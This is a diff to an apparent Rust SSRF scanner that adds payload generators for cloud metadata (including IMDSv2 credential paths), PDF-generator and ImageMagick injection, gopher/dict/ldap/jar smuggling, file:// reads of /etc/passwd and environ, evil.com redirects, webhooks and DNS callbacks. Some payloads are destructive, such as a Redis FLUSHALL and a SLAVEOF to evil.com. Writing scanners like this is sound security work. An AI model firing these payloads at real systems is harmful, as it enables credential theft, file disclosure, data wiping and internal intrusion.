@@ -23,6 +23,8 @@
 
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::{HttpClient, HttpResponse};
+use crate::oob_detector::{OobDetector, OobVulnType};
+use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
@@ -35,6 +37,7 @@ use tracing::{debug, info};
 #[derive(Debug, Clone, PartialEq)]
 pub enum SsrfBypassCategory {
     CloudMetadata,
+    CloudMetadataImdsv2,
     IpObfuscation,
     DnsRebinding,
     UrlParserDifferential,
@@ -49,12 +52,17 @@ pub enum SsrfBypassCategory {
     DnsExfiltration,
     CloudServices,
     ContainerMetadata,
+    PdfGenerator,
+    ImageProcessor,
+    UrlPreview,
+    WebhookSsrf,
 }
 
 impl SsrfBypassCategory {
     fn as_str(&self) -> &str {
         match self {
             Self::CloudMetadata => "Cloud Metadata",
+            Self::CloudMetadataImdsv2 => "Cloud Metadata IMDSv2",
             Self::IpObfuscation => "IP Obfuscation",
             Self::DnsRebinding => "DNS Rebinding",
             Self::UrlParserDifferential => "URL Parser Differential",
@@ -69,6 +77,10 @@ impl SsrfBypassCategory {
             Self::DnsExfiltration => "DNS Exfiltration",
             Self::CloudServices => "Cloud Services",
             Self::ContainerMetadata => "Container Metadata",
+            Self::PdfGenerator => "PDF Generator SSRF",
+            Self::ImageProcessor => "Image Processor SSRF",
+            Self::UrlPreview => "URL Preview/Unfurling SSRF",
+            Self::WebhookSsrf => "Webhook SSRF",
         }
     }
 }
@@ -105,7 +117,15 @@ impl SsrfScanner {
             return Ok((Vec::new(), 0));
         }
 
-        info!("[SSRF] Enterprise scanner - testing parameter: {}", parameter);
+        // Smart parameter filtering - SSRF needs URL/callback parameters
+        if ParameterFilter::should_skip_parameter(parameter, ScannerType::SSRF) {
+            debug!("[SSRF] Skipping non-URL parameter: {}", parameter);
+            return Ok((Vec::new(), 0));
+        }
+
+        info!("[SSRF] Enterprise scanner - testing parameter: {} (priority: {})",
+              parameter,
+              ParameterFilter::get_parameter_priority(parameter));
 
         let baseline = match self.http_client.get(base_url).await {
             Ok(response) => response,
@@ -846,6 +866,665 @@ impl SsrfScanner {
         payloads
     }
 
+    /// Generate AWS IMDSv2 payloads (requires token from PUT request)
+    /// IMDSv2 requires a token obtained via PUT to /latest/api/token with TTL header
+    fn generate_imdsv2_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+        let metadata_ips = vec!["169.254.169.254", "0xa9fea9fe", "2852039166"];
+
+        // IMDSv2 token endpoint - requires PUT with header X-aws-ec2-metadata-token-ttl-seconds
+        for ip in &metadata_ips {
+            payloads.push(SsrfPayload {
+                payload: format!("http://{}/latest/api/token", ip),
+                category: SsrfBypassCategory::CloudMetadataImdsv2,
+                description: "AWS IMDSv2 token endpoint (requires PUT)".to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // IMDSv2-protected endpoints (require X-aws-ec2-metadata-token header)
+        let imdsv2_paths = vec![
+            "/latest/meta-data/",
+            "/latest/meta-data/iam/security-credentials/",
+            "/latest/user-data/",
+            "/latest/dynamic/instance-identity/document",
+        ];
+
+        for ip in &metadata_ips {
+            for path in &imdsv2_paths {
+                payloads.push(SsrfPayload {
+                    payload: format!("http://{}{}", ip, path),
+                    category: SsrfBypassCategory::CloudMetadataImdsv2,
+                    description: "AWS IMDSv2 protected endpoint".to_string(),
+                    severity: Severity::Critical,
+                });
+            }
+        }
+
+        payloads
+    }
+
+    /// Generate PDF Generator SSRF payloads
+    /// Tests various HTML/SVG injection vectors for PDF generation tools
+    fn generate_pdf_generator_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // wkhtmltopdf payloads - iframe, img, link injection
+        let html_payloads = vec![
+            (
+                r#"<html><body><iframe src="http://169.254.169.254/latest/meta-data/"></iframe></body></html>"#,
+                "wkhtmltopdf iframe metadata"
+            ),
+            (
+                r#"<html><body><iframe src="http://127.0.0.1:80/"></iframe></body></html>"#,
+                "wkhtmltopdf iframe localhost"
+            ),
+            (
+                r#"<html><body><iframe src="http://192.168.1.1/admin"></iframe></body></html>"#,
+                "wkhtmltopdf iframe internal"
+            ),
+            (
+                r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
+                "wkhtmltopdf img metadata"
+            ),
+            (
+                r#"<html><body><object data="http://169.254.169.254/latest/meta-data/"></object></body></html>"#,
+                "wkhtmltopdf object metadata"
+            ),
+            (
+                r#"<html><body><embed src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
+                "wkhtmltopdf embed metadata"
+            ),
+        ];
+
+        for (payload, desc) in html_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::PdfGenerator,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // WeasyPrint CSS injection
+        let css_payloads = vec![
+            (
+                r#"<html><head><link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
+                "WeasyPrint CSS metadata"
+            ),
+            (
+                r#"<html><head><link rel="stylesheet" href="http://192.168.1.1/style.css"></head><body>Test</body></html>"#,
+                "WeasyPrint CSS internal"
+            ),
+            (
+                r#"<html><head><style>@import url('http://169.254.169.254/latest/meta-data/');</style></head><body>Test</body></html>"#,
+                "WeasyPrint @import metadata"
+            ),
+            (
+                r#"<html><body style="background: url('http://169.254.169.254/latest/meta-data/')">Test</body></html>"#,
+                "WeasyPrint background-url metadata"
+            ),
+        ];
+
+        for (payload, desc) in css_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::PdfGenerator,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // Headless Chrome payloads
+        let chrome_payloads = vec![
+            (
+                r#"<html><body><img src="http://169.254.169.254/latest/meta-data/"></body></html>"#,
+                "Chrome headless img metadata"
+            ),
+            (
+                r#"<html><body><script src="http://169.254.169.254/latest/meta-data/"></script></body></html>"#,
+                "Chrome headless script metadata"
+            ),
+            (
+                r#"<html><head><link rel="prefetch" href="http://169.254.169.254/latest/meta-data/"></head><body>Test</body></html>"#,
+                "Chrome headless prefetch metadata"
+            ),
+        ];
+
+        for (payload, desc) in chrome_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::PdfGenerator,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // SVG-based payloads (embedded in HTML)
+        let svg_payloads = vec![
+            (
+                r#"<html><body><svg><image xlink:href="http://169.254.169.254/latest/meta-data/"></image></svg></body></html>"#,
+                "SVG image xlink metadata"
+            ),
+            (
+                r#"<html><body><svg><use xlink:href="http://169.254.169.254/latest/meta-data/"></use></svg></body></html>"#,
+                "SVG use xlink metadata"
+            ),
+            (
+                r#"<html><body><svg><foreignObject><img src="http://169.254.169.254/latest/meta-data/"/></foreignObject></svg></body></html>"#,
+                "SVG foreignObject img metadata"
+            ),
+        ];
+
+        for (payload, desc) in svg_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::PdfGenerator,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // File protocol via PDF generators
+        let file_payloads = vec![
+            (
+                r#"<html><body><iframe src="file:///etc/passwd"></iframe></body></html>"#,
+                "PDF generator file:// /etc/passwd"
+            ),
+            (
+                r#"<html><body><img src="file:///etc/hosts"></body></html>"#,
+                "PDF generator file:// /etc/hosts"
+            ),
+        ];
+
+        for (payload, desc) in file_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::PdfGenerator,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate Image Processor SSRF payloads
+    /// Tests ImageMagick, GraphicsMagick, and other image processing SSRF vectors
+    fn generate_image_processor_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // SVG with embedded SSRF for ImageMagick/GraphicsMagick
+        let svg_payloads = vec![
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
+                "ImageMagick SVG xlink metadata"
+            ),
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://127.0.0.1:6379/"/></svg>"#,
+                "ImageMagick SVG xlink localhost Redis"
+            ),
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://192.168.1.1/admin"/></svg>"#,
+                "ImageMagick SVG xlink internal"
+            ),
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>"#,
+                "ImageMagick SVG use xlink metadata"
+            ),
+        ];
+
+        for (payload, desc) in svg_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::ImageProcessor,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // ImageMagick MVG (Magick Vector Graphics) payloads
+        let mvg_payloads = vec![
+            (
+                r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/' pop graphic-context"#,
+                "ImageMagick MVG metadata"
+            ),
+            (
+                r#"push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'http://127.0.0.1:80/' pop graphic-context"#,
+                "ImageMagick MVG localhost"
+            ),
+        ];
+
+        for (payload, desc) in mvg_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::ImageProcessor,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // MSL (Magick Scripting Language) - ImageMagick specific
+        let msl_payloads = vec![
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://169.254.169.254/latest/meta-data/" /></image>"#,
+                "ImageMagick MSL read metadata"
+            ),
+            (
+                r#"<?xml version="1.0" encoding="UTF-8"?><image><read filename="http://127.0.0.1/" /></image>"#,
+                "ImageMagick MSL read localhost"
+            ),
+        ];
+
+        for (payload, desc) in msl_payloads {
+            payloads.push(SsrfPayload {
+                payload: payload.to_string(),
+                category: SsrfBypassCategory::ImageProcessor,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // URL-based image references (for endpoints that fetch images)
+        let url_payloads = vec![
+            ("https://example.com/logo.svg#http://169.254.169.254/latest/meta-data/", "SVG URL fragment metadata"),
+            ("https://example.com/logo.svg?url=http://169.254.169.254/latest/meta-data/", "SVG URL param metadata"),
+            ("http://169.254.169.254/latest/meta-data/logo.svg", "Direct SVG metadata URL"),
+            ("http://127.0.0.1/image.png", "Direct localhost image"),
+            ("http://192.168.1.1/admin/logo.png", "Direct internal image"),
+        ];
+
+        for (url, desc) in url_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ImageProcessor,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // File protocol for image processors
+        let file_payloads = vec![
+            ("file:///etc/passwd", "ImageMagick file:// /etc/passwd"),
+            ("file:///etc/hosts", "ImageMagick file:// /etc/hosts"),
+            ("file:///proc/self/environ", "ImageMagick file:// environ"),
+        ];
+
+        for (url, desc) in file_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ImageProcessor,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate advanced protocol smuggling payloads beyond basic file/gopher
+    fn generate_advanced_protocol_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // Extended gopher payloads
+        let gopher_payloads = vec![
+            ("gopher://127.0.0.1:6379/_SET%20key%20value", "Gopher Redis SET"),
+            ("gopher://127.0.0.1:6379/_GET%20key", "Gopher Redis GET"),
+            ("gopher://127.0.0.1:6379/_FLUSHALL", "Gopher Redis FLUSHALL"),
+            ("gopher://127.0.0.1:6379/_SLAVEOF%20evil.com%206379", "Gopher Redis SLAVEOF"),
+            ("gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254", "Gopher AWS metadata"),
+            ("gopher://127.0.0.1:9000/_", "Gopher FastCGI"),
+            ("gopher://127.0.0.1:11211/_set%20test%200%200%205%0D%0Avalue", "Gopher Memcached SET"),
+        ];
+
+        for (url, desc) in gopher_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ProtocolSmuggling,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // Dict protocol for various services
+        let dict_payloads = vec![
+            ("dict://127.0.0.1:6379/info", "Dict Redis info"),
+            ("dict://127.0.0.1:6379/config:GET:*", "Dict Redis config"),
+            ("dict://127.0.0.1:11211/stats", "Dict Memcached stats"),
+            ("dict://127.0.0.1:11211/version", "Dict Memcached version"),
+            ("dict://169.254.169.254:80/latest", "Dict AWS metadata"),
+        ];
+
+        for (url, desc) in dict_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ProtocolSmuggling,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // LDAP protocol
+        let ldap_payloads = vec![
+            ("ldap://127.0.0.1:389/", "LDAP localhost"),
+            ("ldap://127.0.0.1:389/dc=example,dc=com", "LDAP query"),
+            ("ldap://internal.local:389/", "LDAP internal"),
+            ("ldaps://127.0.0.1:636/", "LDAPS localhost"),
+        ];
+
+        for (url, desc) in ldap_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ProtocolSmuggling,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // JAR protocol (Java)
+        let jar_payloads = vec![
+            ("jar:http://127.0.0.1/malicious.jar!/", "JAR localhost"),
+            ("jar:http://169.254.169.254/latest/meta-data/!/", "JAR AWS metadata"),
+            ("jar:file:///etc/passwd!/", "JAR file protocol"),
+        ];
+
+        for (url, desc) in jar_payloads {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ProtocolSmuggling,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // Additional file:// paths
+        let file_paths = vec![
+            ("file:///c:/windows/system32/drivers/etc/hosts", "Windows hosts"),
+            ("file:///c:/windows/win.ini", "Windows win.ini"),
+            ("file:///c:/boot.ini", "Windows boot.ini"),
+            ("file://\\\\127.0.0.1\\c$\\windows\\win.ini", "UNC localhost"),
+            ("file://127.0.0.1/etc/passwd", "File with host"),
+        ];
+
+        for (url, desc) in file_paths {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::ProtocolSmuggling,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate URL Preview/Unfurling SSRF payloads
+    /// Tests Slack-style link preview functionality and OpenGraph fetchers
+    fn generate_url_preview_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // Direct metadata URLs for preview
+        let preview_urls = vec![
+            ("http://169.254.169.254/latest/meta-data/", "Preview AWS metadata"),
+            ("http://metadata.google.internal/computeMetadata/v1/", "Preview GCP metadata"),
+            ("http://127.0.0.1/", "Preview localhost"),
+            ("http://127.0.0.1:6379/", "Preview Redis"),
+            ("http://127.0.0.1:9200/", "Preview Elasticsearch"),
+            ("http://192.168.1.1/", "Preview internal network"),
+            ("http://10.0.0.1/admin", "Preview internal admin"),
+            ("http://localhost:8080/", "Preview localhost alt port"),
+        ];
+
+        for (url, desc) in preview_urls {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::UrlPreview,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // Redirect-based preview bypass
+        // These would require a redirect service, but we test the pattern
+        let redirect_patterns = vec![
+            ("http://evil.com/redirect?url=http://169.254.169.254/latest/meta-data/", "Preview redirect metadata"),
+            ("http://evil.com/redirect?url=http://127.0.0.1/", "Preview redirect localhost"),
+            ("http://evil.com/r?to=http://192.168.1.1/admin", "Preview redirect internal"),
+        ];
+
+        for (url, desc) in redirect_patterns {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::UrlPreview,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // OpenGraph meta tag URLs (these get fetched by preview tools)
+        let opengraph_urls = vec![
+            ("http://169.254.169.254/latest/meta-data/og-image.jpg", "OpenGraph metadata image"),
+            ("http://127.0.0.1/og-image.png", "OpenGraph localhost image"),
+            ("http://192.168.1.1/preview.jpg", "OpenGraph internal image"),
+        ];
+
+        for (url, desc) in opengraph_urls {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::UrlPreview,
+                description: desc.to_string(),
+                severity: Severity::Medium,
+            });
+        }
+
+        // Protocol-based preview bypass
+        let protocol_previews = vec![
+            ("file:///etc/passwd", "Preview file protocol"),
+            ("gopher://127.0.0.1:6379/_INFO", "Preview gopher Redis"),
+            ("dict://127.0.0.1:11211/stats", "Preview dict Memcached"),
+        ];
+
+        for (url, desc) in protocol_previews {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::UrlPreview,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate Webhook SSRF payloads
+    /// Tests webhook registration and callback mechanisms
+    fn generate_webhook_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // Internal network webhooks
+        let webhook_urls = vec![
+            ("http://192.168.1.1/admin", "Webhook internal admin"),
+            ("http://192.168.1.1:8080/", "Webhook internal 8080"),
+            ("http://10.0.0.1/", "Webhook 10.0.0.1"),
+            ("http://10.0.0.1:9000/", "Webhook 10.0.0.1:9000"),
+            ("http://172.16.0.1/", "Webhook 172.16.0.1"),
+            ("http://172.16.0.1:8443/", "Webhook 172.16.0.1:8443"),
+        ];
+
+        for (url, desc) in webhook_urls {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::WebhookSsrf,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // Localhost webhooks
+        let localhost_webhooks = vec![
+            ("http://127.0.0.1/webhook", "Webhook localhost"),
+            ("http://127.0.0.1:8080/callback", "Webhook localhost 8080"),
+            ("http://localhost/admin", "Webhook localhost admin"),
+            ("http://localhost:3000/", "Webhook localhost 3000"),
+            ("http://[::1]/", "Webhook IPv6 localhost"),
+            ("http://0.0.0.0/", "Webhook 0.0.0.0"),
+        ];
+
+        for (url, desc) in localhost_webhooks {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::WebhookSsrf,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // Cloud metadata webhooks
+        let metadata_webhooks = vec![
+            ("http://169.254.169.254/latest/meta-data/", "Webhook AWS metadata"),
+            ("http://metadata.google.internal/computeMetadata/v1/", "Webhook GCP metadata"),
+            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Webhook Azure metadata"),
+        ];
+
+        for (url, desc) in metadata_webhooks {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::WebhookSsrf,
+                description: desc.to_string(),
+                severity: Severity::Critical,
+            });
+        }
+
+        // Service discovery webhooks
+        let service_webhooks = vec![
+            ("http://redis:6379/", "Webhook Redis service"),
+            ("http://elasticsearch:9200/", "Webhook Elasticsearch service"),
+            ("http://mysql:3306/", "Webhook MySQL service"),
+            ("http://postgres:5432/", "Webhook PostgreSQL service"),
+            ("http://mongodb:27017/", "Webhook MongoDB service"),
+            ("http://kafka:9092/", "Webhook Kafka service"),
+        ];
+
+        for (url, desc) in service_webhooks {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::WebhookSsrf,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        // Protocol-based webhooks
+        let protocol_webhooks = vec![
+            ("file:///etc/passwd", "Webhook file protocol"),
+            ("gopher://127.0.0.1:6379/_INFO", "Webhook gopher Redis"),
+            ("dict://127.0.0.1:11211/stats", "Webhook dict Memcached"),
+        ];
+
+        for (url, desc) in protocol_webhooks {
+            payloads.push(SsrfPayload {
+                payload: url.to_string(),
+                category: SsrfBypassCategory::WebhookSsrf,
+                description: desc.to_string(),
+                severity: Severity::High,
+            });
+        }
+
+        payloads
+    }
+
+    /// Generate OOB (Out-of-Band) DNS exfiltration payloads
+    /// These use DNS callbacks to detect blind SSRF vulnerabilities
+    fn generate_oob_dns_payloads(&self) -> Vec<SsrfPayload> {
+        let mut payloads = Vec::new();
+
+        // Create OOB detector for generating callback URLs
+        let oob = OobDetector::new();
+
+        // DNS exfiltration via HTTP callbacks
+        let dns_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+
+        // HTTP request to trigger DNS lookup
+        payloads.push(SsrfPayload {
+            payload: format!("http://{}/", dns_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "DNS callback detection".to_string(),
+            severity: Severity::High,
+        });
+
+        payloads.push(SsrfPayload {
+            payload: format!("https://{}/", dns_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "DNS callback HTTPS".to_string(),
+            severity: Severity::High,
+        });
+
+        // Gopher protocol with DNS callback
+        let gopher_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("gopher://{}:80/_GET%20/%20HTTP/1.1", gopher_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "Gopher DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // Dict protocol with DNS callback
+        let dict_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("dict://{}:11211/stats", dict_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "Dict DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // LDAP with DNS callback
+        let ldap_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("ldap://{}:389/", ldap_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "LDAP DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // FTP with DNS callback
+        let ftp_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("ftp://{}:21/", ftp_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "FTP DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // TFTP with DNS callback
+        let tftp_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("tftp://{}/test.txt", tftp_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "TFTP DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // File protocol with DNS callback (some parsers make DNS lookups for UNC paths)
+        let file_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("file://{}//etc/passwd", file_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "File UNC DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        // SMB/UNC path for Windows (triggers DNS lookup)
+        let smb_callback = oob.generate_dns_payload(OobVulnType::Ssrf);
+        payloads.push(SsrfPayload {
+            payload: format!("\\\\{}\\share\\file.txt", smb_callback),
+            category: SsrfBypassCategory::DnsExfiltration,
+            description: "SMB UNC DNS callback".to_string(),
+            severity: Severity::High,
+        });
+
+        payloads
+    }
+
     /// Generate focused API payloads for GraphQL/REST JSON APIs
     /// Only tests cloud metadata + localhost (most relevant for APIs)
     fn generate_focused_api_payloads(&self) -> Vec<SsrfPayload> {
@@ -878,12 +1557,15 @@ impl SsrfScanner {
         payloads
     }
 
-    /// Generate enterprise-grade SSRF payloads (2000+)
+    /// Generate enterprise-grade SSRF payloads (3000+)
     fn generate_enterprise_payloads(&self) -> Vec<SsrfPayload> {
         let mut payloads = Vec::new();
 
-        // Cloud metadata - most critical
+        // Cloud metadata - most critical (AWS, GCP, Azure, etc.)
         payloads.extend(self.generate_cloud_metadata_payloads());
+
+        // AWS IMDSv2 specific payloads
+        payloads.extend(self.generate_imdsv2_payloads());
 
         // Localhost bypasses with all variations
         payloads.extend(self.generate_localhost_payloads());
@@ -891,14 +1573,29 @@ impl SsrfScanner {
         // Internal network discovery
         payloads.extend(self.generate_internal_network_payloads());
 
-        // Protocol smuggling
+        // Protocol smuggling (file, gopher, dict, ldap, tftp, etc.)
         payloads.extend(self.generate_protocol_payloads());
+
+        // Advanced protocol smuggling (extended gopher, dict, ldap, jar)
+        payloads.extend(self.generate_advanced_protocol_payloads());
 
         // URL parser differentials
         payloads.extend(self.generate_url_parser_payloads());
 
         // DNS rebinding
         payloads.extend(self.generate_dns_rebinding_payloads());
+
+        // PDF Generator SSRF (wkhtmltopdf, WeasyPrint, Headless Chrome)
+        payloads.extend(self.generate_pdf_generator_payloads());
+
+        // Image Processor SSRF (ImageMagick, GraphicsMagick)
+        payloads.extend(self.generate_image_processor_payloads());
+
+        // URL Preview/Unfurling SSRF (Slack-style previews, OpenGraph)
+        payloads.extend(self.generate_url_preview_payloads());
+
+        // Webhook SSRF
+        payloads.extend(self.generate_webhook_payloads());
 
         info!("[SSRF] Generated {} enterprise payloads", payloads.len());
         payloads
